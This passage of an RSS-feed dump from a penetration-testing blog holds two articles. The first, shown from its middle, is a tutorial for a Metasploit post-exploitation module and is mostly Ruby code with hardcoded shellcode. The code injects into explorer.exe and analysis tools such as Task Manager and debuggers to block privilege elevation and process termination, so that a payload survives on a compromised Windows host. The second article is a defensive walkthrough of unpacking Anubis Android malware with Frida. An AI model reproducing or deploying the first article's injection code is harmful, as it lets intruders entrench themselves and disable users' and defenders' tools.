\"\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\"\n    block_api_32 &#60;&#60; \"\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\"\n    \n    # https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm\n    block_api_64 = \"\"\n    block_api_64 &#60;&#60; \"\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\"\n    # SNIP ...\n    block_api_64 &#60;&#60; \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\"\n    block_api_64 &#60;&#60; \"\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\"</pre>\n\n\n\n<p>Looks pretty ugly i know <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f600.png\" alt=\"ðŸ˜€\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> If you know a better way to generate block API in post exploit modules let me know.  I also assembled and declared the shellcodes that we prepared in the same way.  </p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"ruby\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">        prevent_elevate_32 = \"\"\n    prevent_elevate_32 &#60;&#60; \"\\xfc\\xe8\\xb6\\x00\\x00\\x00\\x5b\\xe8\\x2f\\x00\\x00\\x00\"\n    prevent_elevate_32 &#60;&#60; \"\\x89\\xc6\\x68\\x10\\xe1\\x8a\\xc3\\xe8\\x23\\x00\\x00\\x00\"\n     # SNIP ...\n    prevent_elevate_32 &#60;&#60; \"\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\"\n    prevent_elevate_32 &#60;&#60; \"\\xc3\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8e\\x5d\\x68\\x2d\\xf9\"\n    prevent_elevate_32 &#60;&#60; \"\\x7f\\xe5\\xff\\xd5\\x68\\x75\\x1f\\x0a\\x33\\xff\\xd5\\xe8\"\n    prevent_elevate_32 &#60;&#60; \"\\x82\\x00\\x00\\x00\"\n    prevent_elevate_32 &#60;&#60; block_api_32\n    prevent_elevate_32 &#60;&#60; \"\\x5d\\xbb\\xe0\\x1d\\x2a\\x0a\\x68\\xa6\\x95\\xbd\"\n    prevent_elevate_32 &#60;&#60; \"\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\"\n    prevent_elevate_32 &#60;&#60; \"\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\"\n\n    prevent_elevate_64 = \"\"\n    prevent_elevate_64 &#60;&#60; \"\\xfc\\xe8\\x16\\x01\\x00\\x00\\x5b\\xe8\\x49\\x00\\x00\\x00\"\n    prevent_elevate_64 &#60;&#60; \"\\x48\\x83\\xc4\\x20\\x48\\x89\\xc6\\x41\\xba\\x10\\xe1\\x8a\"\n    prevent_elevate_64 &#60;&#60; \"\\xc3\\xe8\\x37\\x00\\x00\\x00\\x48\\x83\\xc4\\x20\\x6a\\x00\"\n    prevent_elevate_64 &#60;&#60; \"\\x49\\x89\\xe1\\x41\\xb8\\x40\\x00\\x00\\x00\\xba\\x04\\x00\"\n    prevent_elevate_64 &#60;&#60; \"\\x00\\x00\\x48\\x89\\xf1\\xff\\xd0\\x58\\xe8\\x04\\x00\\x00\"\n    prevent_elevate_64 &#60;&#60; \"\\x00\\x48\\x31\\xc0\\xc3\\x5a\\xb9\\x04\\x00\\x00\\x00\\x8a\"\n    prevent_elevate_64 &#60;&#60; \"\\x02\\x88\\x06\\x48\\xff\\xc6\\x48\\xff\\xc2\\xe2\\xf4\\x53\"\n    prevent_elevate_64 &#60;&#60; \"\\xc3\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\"\n     # SNIP ...\n    prevent_elevate_64 &#60;&#60; \"\\xf9\\x7f\\xe5\\xff\\xd5\\x41\\xba\\x75\\x1f\\x0a\\x33\\xff\"\n    prevent_elevate_64 &#60;&#60; \"\\xd5\\xe8\\xc8\\x00\\x00\\x00\"\n    prevent_elevate_64 &#60;&#60; block_api_64\n    prevent_elevate_64 &#60;&#60; \"\\x5d\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\"\n    prevent_elevate_64 &#60;&#60; \"\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\"\n    prevent_elevate_64 &#60;&#60; \"\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\"\n    prevent_elevate_64 &#60;&#60; \"\\x59\\x41\\x89\\xda\\xff\\xd5\"\n\n    self_defense_64 = \"\"\n    self_defense_64 &#60;&#60; \"\\xfc\\xe8\\xc8\\x00\\x00\\x00\"\n    self_defense_64 &#60;&#60; block_api_64\n    self_defense_64 &#60;&#60; \"\\x5d\\x41\\xba\\x49\\x47\\xc6\\x62\\xff\\xd5\\x49\"\n    self_defense_64 &#60;&#60; \"\\x89\\xc0\\xba\\x00\\x00\\x00\\x00\\xb9\\xff\\x00\\x1f\\x00\"\n    self_defense_64 &#60;&#60; \"\\x41\\xba\\xee\\x95\\xb6\\x50\\xff\\xd5\\x48\\x89\\xc3\\x6a\"\n     # SNIP ...\n    self_defense_64 &#60;&#60; \"\\x78\\x69\\x74\\x55\\x50\\x48\\x89\\xe2\\x41\\xba\\x49\\xf7\"\n    self_defense_64 &#60;&#60; \"\\x02\\x78\\xff\\xd5\\x48\\x89\\xc5\\xe8\\x00\\x00\\x00\\x00\"\n    self_defense_64 &#60;&#60; \"\\x58\\xb9\\xb7\\x01\\x00\\x00\\xc6\\x00\\x00\\x48\\xff\\xc8\"\n    self_defense_64 &#60;&#60; \"\\xe2\\xf8\\x6a\\x00\\xff\\xd5\"\n    \n    self_defense_32= \"\"\n    self_defense_32 &#60;&#60; \"\\xfc\\xe8\\x82\\x00\\x00\\x00\"\n    self_defense_32 &#60;&#60; block_api_32\n    self_defense_32 &#60;&#60; \"\\x5d\\x68\\x49\\x47\\xc6\\x62\\xff\\xd5\"\n    self_defense_32 &#60;&#60; \"\\x50\\x6a\\x00\\x68\\xff\\x0f\\x1f\\x00\\x68\\xee\\x95\\xb6\"\n    self_defense_32 &#60;&#60; \"\\x50\\xff\\xd5\\x89\\xc3\\x6a\\x00\\x68\\x70\\x69\\x33\\x32\"\n     # SNIP ...\n    self_defense_32 &#60;&#60; \"\\x5b\\x0c\\x8b\\x43\\x0c\\xc7\\x40\\x20\\xff\\xff\\xff\\x00\"\n    self_defense_32 &#60;&#60; \"\\xb9\\x44\\x01\\x00\\x00\\xe8\\x00\\x00\\x00\\x00\\x58\\xc6\"\n    self_defense_32 &#60;&#60; \"\\x00\\x00\\x48\\xe2\\xfa\\x6a\\x00\\xff\\xd5\"</pre>\n\n\n\n<p>After declaring the shellcodes now we need to walk all processes and inject our shellcodes into the ones that may cause us trouble. Following code loops true all the processes and injects the shellcode that hooks the AdjustTokenPrivileges and RtlSetDaclSecurityDescriptor APIs. We use the <strong>client.sys.process.processes</strong> method for accessing the process information on target machine. If the process name is <strong>explorer.exe</strong> or any of the analysis tools we declared at the top it will inject our shellcode by calling execute_shellcode function.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"ruby\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    analysis_tools =['taskmgr.exe','procexp64.exe','ida.exe','ida64.exe','windbg.exe','x32dbg.exe','ollydbg.exe','tasklist.exe','cmd.exe','powershell.exe','cheatengine-x86_x64.exe']\n\n    os = client.sys.config.sysinfo['OS']\n    print_status(\"Target OS -> #{os}\")\n\n    client.sys.process.processes.each do |p|\n      begin      \n        # Check Payload Arch\n        if 'explorer.exe' === p['name'].to_s.downcase or analysis_tools.include? p['name'].to_s.downcase\n          print_status(\"Hooking RtlSetDaclSecurityDescriptor on #{p['name']} (#{p['arch']})\")\n          print_status(\"Hooking AdjustTokenPrivileges on #{p['name']} (#{p['arch']})\")\n          if 'x64' === p['arch'].to_s\n            execute_shellcode(prevent_elevate_64,nil,p['pid'].to_i)\n          else\n            execute_shellcode(prevent_elevate_32,nil,p['pid'].to_i)\n          end\n          print_good(\"UAC elevation disabled for #{p['name']}\")\n        end\n      rescue => e\n        print_error(\"API hooking failed: #{e}\")\n      end\n    end\n    </pre>\n\n\n\n<p>Now we need to consider the case if the running OS version is above Windows 7.  We can simply check this with accessing the <strong>client.sys.config.sysinfo[&#8216;OS&#8217;]</strong> structure. We will check the version string and decide if we will use the protect process method or keep hooking APIs. If we need to hook the NtOpenProcess and TerminateProcess APIs we can simply change the function name hashes inside the API hooking shellcode.</p>\n\n\n\n<p> </p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"ruby\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    if os.to_s.include? \"Windows 7\" or os.to_s.include? \"Windows XP\" or os.to_s.include? \"2008\"\n      client.sys.process.processes.each do |p|\n        # Check Payload Arch\n        if pid.to_i === p['pid'].to_i\n          print_status('Injecting self defense shellcode...')\n          if 'x64' === p['arch'].to_s\n            execute_shellcode(self_defense_64,nil,pid)\n          else\n            execute_shellcode(self_defense_32,nil,pid)\n          end\n        end\n      end\n      print_good('Self defense active !')\n    else\n      # Set NtOpenProcess &#38; TerminateProcess hashes\n      prevent_terminate_64 = prevent_elevate_64.sub! \"\\x2D\\xF9\\x7F\\xE5\", \"\\x87\\xDC\\xCA\\x5E\"\n      prevent_terminate_32 = prevent_elevate_32.sub! \"\\x2D\\xF9\\x7F\\xE5\", \"\\x87\\xDC\\xCA\\x5E\"\n\n      prevent_terminate_64 = prevent_elevate_64.sub! \"\\x75\\x1F\\x0A\\x33\", \"\\xA3\\x9D\\xA1\\x23\"\n      prevent_terminate_32 = prevent_elevate_32.sub! \"\\x75\\x1F\\x0A\\x33\", \"\\xA3\\x9D\\xA1\\x23\"\n\n      hooked = \"\"\n      while 1\n        client.sys.process.processes.each do |p|\n          # Check Payload Arch\n          if analysis_tools.include? p['name'].to_s.downcase\n            print_status(\"Hooking TerminateProcess on #{p['name']} (#{p['arch']} - #{p['pid']})\")\n            print_status(\"Hooking NtOpenProcess on #{p['name']} (#{p['arch']} - #{p['pid']})\")\n            begin\n              if 'x64' === p['arch'].to_s\n                execute_shellcode(prevent_terminate_64,nil,p['pid'].to_i)\n              else\n                execute_shellcode(prevent_terminate_32,nil,p['pid'].to_i)\n              end\n              hooked &#60;&#60; p['pid'].to_s+','\n              print_good(\"Process termination disabled for #{p['name']}\")\n            rescue => e\n              print_error(\"API hooking failed: #{e}\")\n            end\n          end\n        end\n        if not datastore['LOOP']\n          break\n        end           \n      end\n    end</pre>\n\n\n\n<p>While replacing the function hashes remember the endianness issue, hash values will be stored in reverse order.  When you look at the source above you&#8217;ll notice execute_shellcode function is called inside a  while condition that is depending on the LOOP parameter of our post module. This mechanism is necessary because  when users create a new task manager process after the execution of our module that process will still able to terminate other processes. So we need a mechanism for continuously injecting our anti process termination shellcode into newly created processes. This is needed only for anti process termination shellcode because other ones are injected into explorer and our  own process, it very is unlikely for a user to relaunch explorer. And finally this was the last part of our post module.  Here is the final <a href=\"https://github.com/EgeBalci/MSF-Self-Defence\">self_defense.rb</a> module. It can be added to Metasploit by simply moving under the <strong>~/.msf4/modules/post/windows</strong> directory. Here what it looks like step by step.</p>\n\n\n\n<p>First we execute our meterpreter payload.  </p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/Peek-2019-07-16-13-37.gif\" alt=\"\" class=\"wp-image-2340\"/></figure>\n\n\n\n<p>After initiating the session  we execute our module by typing <strong>run post/windows/self_defense</strong>.</p>\n\n\n\n<ul class=\"wp-block-gallery columns-1 is-cropped\"><li class=\"blocks-gallery-item\"><figure><img src=\"https://pentest.blog/wp-content/uploads/Peek-2019-07-16-13-39.gif\" alt=\"\" data-id=\"2341\" data-link=\"https://pentest.blog/?attachment_id=2341\" class=\"wp-image-2341\"/></figure></li></ul>\n\n\n\n<p>Now our payload is protected and users are not able to run programs as admin. </p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://github.com/EgeBalci/MSF-Self-Defense/raw/master/poc.gif\" alt=\"\"/></figure>\n\n\n\n<p>This module can be improved in various ways, especially instead of directly disabling the OpenProcess API there can be a simple mechanism that checks the handle parameter and disables only when  our process handle is passed to the function. Also instead of hard-coding our shellcodes into the modules source there can be a more dynamic way to generate them. Especially integrating the Metasploit&#8217;s payload encoding capabilities can allow us to generate unique shellcodes on every execution.   I&#8217;ll be adding new self defense shellcodes to the repositories. Please feel free to contribute to self defense module  and shellcodes. </p>\n\n\n\n<h4>Referances</h4>\n\n\n\n<ul><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess\">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges\">https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor\">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput\">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput</a></li><li><a href=\"https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client\">https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client</a></li><li><a href=\"https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora\">https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora</a></li><li><a href=\"https://docs.microsoft.com/tr-tr/windows/win32/secauthz/security-descriptor-string-format\">https://docs.microsoft.com/tr-tr/windows/win32/secauthz/security-descriptor-string-format</a></li><li><a href=\"https://docs.microsoft.com/tr-tr/windows/win32/secgloss/s-gly\">https://docs.microsoft.com/tr-tr/windows/win32/secgloss/s-gly</a></li><li><a href=\"https://docs.microsoft.com/tr-tr/windows/win32/secgloss/d-gly\">https://docs.microsoft.com/tr-tr/windows/win32/secgloss/d-gly</a></li></ul>\n","descriptionType":"html","publishedDate":"Thu, 15 Aug 2019 09:53:44 +0000","feedId":11893,"bgimg":"https://pentest.blog/wp-content/uploads/Peek-2019-07-04-12-38.gif","linkMd5":"f88146d0e07e8038814706acd9dc7e6b","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn35@2020_6/2020/08/25/01-41-45-408_c17cd4e428ed4465.webp","destWidth":1696,"destHeight":840,"sourceBytes":1141337,"destBytes":345862,"author":"Ege Balci","articleImgCdnMap":{"https://pentest.blog/wp-content/uploads/Peek-2019-07-04-12-38.gif":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn35@2020_6/2020/08/25/01-41-45-408_c17cd4e428ed4465.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f609.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn32@2020_5/2020/08/25/01-41-46-859_80ba72b7642bafbb.webp","https://pentest.blog/wp-content/uploads/screenshot_4-1024x442.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn27@2020_2/2020/08/25/01-41-48-227_3b7b899cb8c580b0.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f600.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn48@2020_3/2020/08/25/01-41-47-982_10c092881059b63a.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_6/2020/08/25/01-41-27-434_818413be4c4fbce7.webp","https://pentest.blog/wp-content/uploads/Peek-2019-07-16-13-37.gif":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn83@2020_4/2020/08/25/01-41-48-376_25da7cdb62d5392f.webp","https://pentest.blog/wp-content/uploads/Peek-2019-07-16-13-39.gif":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn16@2020_5/2020/08/25/01-41-50-214_573f98dd9e8b0e8c.webp","https://github.com/EgeBalci/MSF-Self-Defense/raw/master/poc.gif":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg"},"publishedOrCreatedDate":1598319687285},{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","title":"N Ways to Unpack Mobile Malware","link":"https://pentest.blog/?p=1502","description":"<p>This article will briefly explain methods behind the mobile malware unpacking. It will be focusing on Anubis since it is the latest trending malware for almost a year now. Actors use dropper applications as their primary method of distribution. Droppers find their ways to Google Play store under generic names thereby infecting devices with Anubis. An example of a such dropper may found in the references. There were at least forty cases in Google Play in the last fall targeting Turkish users. <a href=\"https://twitter.com/LukasStefanko/status/1084728042927341569\">@LukasStefanko’s twitter thread</a> may be helpful to get an overview of such campaigns. Anubis malware already analysed by fellows from the industry in a detailed manner. Therefore readers should find it more valuable to have an article focusing on packer mechanisms of Anubis.</p> \n<span id=\"more-1502\"></span> \n<p>The sample used in this article is available at the references section. I strongly recommend downloading the sample and following through the article. I will be dividing this post into three sections.</p> \n<ul>\n <li> <a href=\"https://pentest.blog/?p=1502#packer\"> Packers in Android Ecosystem</a> </li>\n <li> <a href=\"https://pentest.blog/?p=1502#catch\"> Catching Packers with Frida </a> </li>\n <li> <a href=\"https://pentest.blog/?p=1502#defeat\">How To Defeat Packers </a>\n  <ul>\n   <li>Dynamically</li>\n   <li>Statically</li>\n  </ul></li>\n</ul> \n<h2 id=\"packer\">Packers in Android Ecosystem</h2> \n<p>Mobile malwares also make use of packers to hide their malicious payloads from researchers and AV programs. This includes reflection, obfuscation, code-flow flattening and trash codes to make unpacking process stealthy. All mechanisms mentioned are used by the Anubis packer and therefore will be explored in this article.</p> \n<h4>Loading classes at runtime<br /></h4> \n<p>Android applications must define their used services, receivers, activity classes in AndroidManifest file to use them. In Anubis samples, it is clear that there are many classes not defined in the Manifest file that are simply present in the source code.</p> \n<ul class=\"wp-block-gallery columns-1 is-cropped\">\n <li class=\"blocks-gallery-item\">\n  <figure>\n   <img src=\"https://pentest.blog/wp-content/uploads/mani.png\" alt=\"\" data-id=\"1590\" data-link=\"https://pentest.blog/?attachment_id=1590\" class=\"wp-image-1590\" srcset=\"https://pentest.blog/wp-content/uploads/mani.png 766w, https://pentest.blog/wp-content/uploads/mani-300x224.png 300w\" sizes=\"(max-width: 766px) 100vw, 766px\" />\n  </figure></li>\n</ul> \n<p>This means that a file with non-defined classes should be loaded into application at run-time. There are two main ways of run-time loading in Android:</p> \n<p style=\"text-align:left\"><strong>From file:</strong></p> \n<ul>\n <li>dalvik.system.DexFile.loadDex depreciated after API 26</li>\n <li>dalvik.system.DexClassLoader</li>\n <li>dalvik.system.PathClassLoader </li>\n</ul> \n<p><strong>From memory: </strong></p> \n<ul>\n <li>dalvik.system.InMemoryDexClassLoader (not common in malwares)</li>\n</ul> \n<p>Loading from the file requires a dex/jar file to be present in file system. Anubis unpacks the encrypted data file and then drops the decrypted version. Later on malware proceeds loading decrypted dex into the application. After loading with DexClassLoader, malware removes the decrypted dex file. Tracing the dexClassLoader should make the loading routine clear. Since dexClassLoader is a class of dalvik.system package “dalvik.system.dexClassLoader” should be in the code but it is nowhere to be found.</p> \n<div class=\"wp-block-image\">\n <figure class=\"aligncenter\">\n  <img src=\"https://pentest.blog/wp-content/uploads/mzw9z.gif\" alt=\"\" class=\"wp-image-1651\" />\n </figure>\n</div> \n<h4>Reflection<br /></h4> \n<p>Another useful method when dealing with malware is reflection. Reflection is an important concept in Java which lets you to call methods/classes without knowing about them in compile time. There are several classes/methods for reflection.</p> \n<ul>\n <li>java.lang.Class.forName </li>\n <li>java.lang.ClassLoader.loadClass </li>\n <li>java.lang.reflect.Method </li>\n <li>java.lang.Class.getMethods </li>\n</ul> \n<p>Example usage of forName</p> \n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">cObj = Class.forName(\"dalvik.system.dexClassLoader\");</pre> \n<p>cObj variable holds the class object of dexClassLoader. This enables program to call methods of any given class. The problem is to find where function calls are made to reflection methods.</p> \n<h2 id=\"catch\">Catching packers with Frida</h2> \n<p><a href=\"https://frida.re/\">frida</a> is a dynamic instrumentation toolkit supported by nearly every operating system. Frida makes it possible to inject a piece of code to manipulate target program and also to trace program calls. In this case it will be used for tracing which reflection calls are made thereby analysing the threads. When previously mentioned function calls are made, console.log will be called additionally. But before that, let’s take a quick recap on how to setup Frida on android emulator.</p> \n<p>Download frida-server suitable with your emulator from:<br>(e.g Genymotion uses x86 architecture.)<br><a href=\"https://github.com/frida/frida/releases\">https://github.com/frida/frida/releases</a>.</br></br></p> \n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">adb push frida-server /data/local/tmp\nadb shell\ncd /data/local/tmp\nchmod +x frida-server\n./frida-server &amp;</pre> \n<p>Frida tools should be installed in host machine by running<br><code>pip install frida-tools</code></br></p> \n<p>After the setup, we can write a script to hook our target methods. We will start by defining variables for classes of our methods.</p> \n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">var classDef = Java.use('java.lang.Class');\nvar classLoaderDef = Java.use('java.lang.ClassLoader');\nvar loadClass = classLoaderDef.loadClass.overload('java.lang.String', 'boolean');\nvar forName = classDef.forName.overload('java.lang.String', 'boolean', 'java.lang.ClassLoader');\nvar reflect = Java.use('java.lang.reflect.Method')\nvar member = Java.use('java.lang.reflect.Member')\nvar dalvik = Java.use(\"dalvik.system.DexFile\")\nvar dalvik2 = Java.use(\"dalvik.system.DexClassLoader\")\nvar dalvik3 = Java.use(\"dalvik.system.PathClassLoader\")\n//var dalvik4 = Java.use(\"dalvik.system.InMemoryDexClassLoader\")\nvar f = Java.use(\"java.io.File\")\nvar url = Java.use(\"java.net.URL\")\nvar obj = Java.use(\"java.lang.Object\")\nvar fo = Java.use(\"java.io.FileOutputStream\")</pre> \n<p>We will be using this code snippet to change implementation of a method.</p> \n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">class.targetmethod.implementation = function(){\n    console.log(\"[+] targetmethod catched !\")\n    stackTrace()\n    return this.targetmethod()\n}</pre> \n<p><code>console.log(\"[+] {x} function catched !\")</code> will enable us to see if the function is called. If function takes any parameters such as a string, logging those may become helpful during the analysis. Then we can get more information about the thread we are in. Frida is able to call any android function including <code>getStackTrace()</code>. But that requires a reference to the current thread object. Let’s start by getting instance of the thread class:</p> \n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">var ThreadDef = Java.use('java.lang.Thread');\nvar ThreadObj = ThreadDef.$new();</pre> \n<p>ThreadObj holds instance of the Thread class and <code>currentThread()</code> can be used to get thread according to <a href=\"https://developer.android.com/reference/java/lang/Thread.html\">https://developer.android.com/reference/java/lang/Thread.html</a>. <br>We can now use <code>getStackTrace()</code>and also loop through stackElements to print the call stack.</br></p> \n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    function stackTrace() {\n        console.log(\"------------START STACK---------------\")\n        var stack = ThreadObj.currentThread().getStackTrace();\n        for (var i = 0; i &lt; stack.length; i++) {\n            console.log(i + \" =&gt; \" + stack[i].toString());\n        }\n        console.log(\"------------END STACK---------------\");\n    }</pre> \n<p>Printing call stack helps to identify call graph of reflections and unpacking mechanisms. For example dexClassLoader might have created with reflection. But when frida hooks into dexClassLoader and prints the call stack, we can see the functions before dexClassLoader is called. Unpacking routines are called at the very beginning of the application. Therefore frida should be attached as soon as possible to catch the unpacking process. Fortunately -f option in frida enables frida to spawn target app itself. frida accepts scripts with the -l parameter.<br><code>frida -U -f appname -l dereflect.js</code><br>Then frida waits input from the user to continue. <code>%resume</code> will resume the process. Full script is available at my github repository.<br><a href=\"https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/dereflect.js\">https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/dereflect.js</a></br></br></br></p> \n<figure class=\"wp-block-image\">\n <img src=\"https://pentest.blog/wp-content/uploads/ppp_1.png\" alt=\"\" class=\"wp-image-1641\" srcset=\"https://pentest.blog/wp-content/uploads/ppp_1.png 963w, https://pentest.blog/wp-content/uploads/ppp_1-300x57.png 300w, https://pentest.blog/wp-content/uploads/ppp_1-768x145.png 768w\" sizes=\"(max-width: 963px) 100vw, 963px\" />\n <figcaption>\n  Output without the stackTrace():\n </figcaption>\n</figure> \n<figure class=\"wp-block-image\">\n <img src=\"https://pentest.blog/wp-content/uploads/ppp_2.png\" alt=\"\" class=\"wp-image-1642\" srcset=\"https://pentest.blog/wp-content/uploads/ppp_2.png 768w, https://pentest.blog/wp-content/uploads/ppp_2-300x219.png 300w\" sizes=\"(max-width: 768px) 100vw, 768px\" />\n <figcaption>\n  With stackTrace()\n </figcaption>\n</figure> \n<p><em>Voila</em>.<br>You can see the functions called before the write method. After tracing these interval functions, you can see<code>RNlkfTEUX</code> and <code>lqfRafMrGew</code>are called right before them. And turns out they are very important functions used in decryption of the encrypted file which we will come back later on.</br></p> \n<h2 id=\"defeat\"><strong>How to Defeat Packers</strong></h2> \n<p>We can divide unpacking methods into two sections. Both ways lead to the decrypted file.</p> \n<h3>Dynamically </h3> \n<ul>\n <li>By hooking: \n  <ul>\n   <li>Intercept file.delete (Java level)</li>\n   <li>Intercept unlink syscall (system level) </li>\n  </ul></li>\n <li>From memory: \n  <ul>\n   <li>Dump the memory with gameguardian</li>\n   <li>Dump the memory with custom tools </li>\n  </ul></li>\n</ul> \n<h3>Statically:</h3> \n<ul>\n <li>Hands on manual unpacking</li>\n</ul> \n<p><strong>Dynamically: </strong><br>Intercepting methods is the easiest way.</br></p> \n<p><strong>By hooking : Java Level</strong><br>When I first encountered Anubis and realized it was dropping a file, my first solution was hooking into file.delete function.</br></p> \n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">Java.perform(function() { \n   var f = Java.use(\"java.io.File\") \n   f.delete.implementation = function(a){ \n       s = this.getAbsolutePath() \n       if(s.includes(\"jar\")){ \n          console.log(\"[+] Delete catched =&gt;\" +this.getAbsolutePath()) \n       } \n       return true \n   } \n}) </pre> \n<p>This piece of code always returns true to file.delete function. After intercepting we can pull the dropped jar file. <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/2714.png\" alt=\"âœ”\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p> \n<ul class=\"wp-block-gallery columns-1 is-cropped\">\n <li class=\"blocks-gallery-item\">\n  <figure>\n   <img src=\"https://pentest.blog/wp-content/uploads/del.png\" alt=\"\" data-id=\"1574\" data-link=\"https://pentest.blog/?attachment_id=1574\" class=\"wp-image-1574\" srcset=\"https://pentest.blog/wp-content/uploads/del.png 940w, https://pentest.blog/wp-content/uploads/del-300x87.png 300w, https://pentest.blog/wp-content/uploads/del-768x223.png 768w\" sizes=\"(max-width: 940px) 100vw, 940px\" />\n  </figure></li>\n</ul> \n<p>In addition to this we can automate our job with python bindings of frida and go through the folder that our target files are in. There are generally thousands of apks generated from those c&amp;c servers. Since each of them can have different IP addresses embedded, an <a href=\"https://twitter.com/0xabc0/status/1072888987285630976\">automated</a> tool could make our life easier. <br><br><br /></br></br></p> \n<p><strong>By Hooking : System Level</strong><br>But what if malware uses native code to delete files? We can not always hook at Java level. We need to get deeper. What syscall is responsible for deleting file from file system and in libc?</br></p> \n<ul class=\"wp-block-gallery alignleft columns-1 is-cropped\">\n <li class=\"blocks-gallery-item\">\n  <figure>\n   <img src=\"https://pentest.blog/wp-content/uploads/155136004439210407.png\" alt=\"\" data-id=\"1589\" 